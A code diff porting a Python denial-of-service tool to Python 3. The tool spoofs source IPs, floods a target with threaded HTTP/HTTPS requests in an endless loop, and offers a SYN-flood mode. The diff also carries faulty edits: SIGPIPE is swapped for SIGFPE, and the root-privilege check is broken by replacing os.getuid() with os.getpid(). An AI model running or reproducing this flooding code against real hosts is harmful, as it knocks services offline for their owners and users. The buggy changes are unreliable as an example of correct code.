@@ -45,18 +45,18 @@ except:
 	try:
 		if os.name == 'posix':
 			os.system('sudo pip install colorama termcolor requests')
-			sys.exit('[+] I have installed nessecary modules for you')
+			sys.exit('[+] I have installed necessary modules for you')
 		elif os.name == 'nt':
-			os.sytem('c:\python27\scripts\pip.exe install colorama requests termcolor')
+			os.system('pip install colorama requests termcolor')
 			sys.exit('[+] I have installed nessecary modules for you')
 		else:
-			sys.exit('[-] Download and install nessecary modules')
+			sys.exit('[-] Download and install necessary modules')
 	except Exception as e:
 		print ('[-]',e)
 if os.name == 'nt':
 	colorama.init()
 
-signal.signal(signal.SIGPIPE,signal.SIG_DFL)
+signal.signal(signal.SIGFPE,signal.SIG_DFL)
 
 def fake_ip():
 	while True:
@@ -197,7 +197,7 @@ class Requester(Thread):
 		self.ssl = False
 		self.req = []
 		self.lock=Lock()
-		url_type = urlparse.urlparse(self.tgt)
+		url_type = urllib.parse.urlparse(self.tgt)
 		if url_type.scheme == 'https':
 			self.ssl = True
 			if self.ssl == True:
@@ -238,9 +238,9 @@ class Requester(Thread):
 	def run(self):
 		try:
 			if self.ssl:
-				conn = httplib.HTTPSConnection(self.tgt,self.port)
+				conn = http.client.HTTPSConnection(self.tgt,self.port)
 			else:
-				conn = httplib.HTTPConnection(self.tgt,self.port)
+				conn = http.client.HTTPConnection(self.tgt,self.port)
 				self.req.append(conn)
 			for reqter in self.req:
 				(url,http_header) = self.data()
@@ -376,7 +376,7 @@ Example:
 	if args.d:
 		check_tgt(args)
 	if args.Synflood:
-		uid = os.getuid()
+		uid = os.getpid()
 		if uid == 0:
 			cprint('[*] You have enough permisson to run this script','green')
 			time.sleep(0.5)
@@ -396,7 +396,7 @@ Example:
 			else:
 				ip = args.i
 			try:
-				for x in xrange(0,int(args.T)):
+				for x in range(0,int(args.T)):
 					thread=Synflood(tgt,ip,sock=synsock)
 					thread.setDaemon(True)
 					thread.start()
@@ -409,9 +409,9 @@ Example:
 		print (colored('[*] Start send request to: ','blue')+colored(tgt,'red'))
 		while 1:
 			try:
-				for x in xrange(int(args.T)):
+				for x in range(int(args.T)):
 					t=Requester(tgt)
-					t.setDaemon(True)
+					t.daemon = True
 					t.start()
 					t.join()
 			except KeyboardInterrupt:
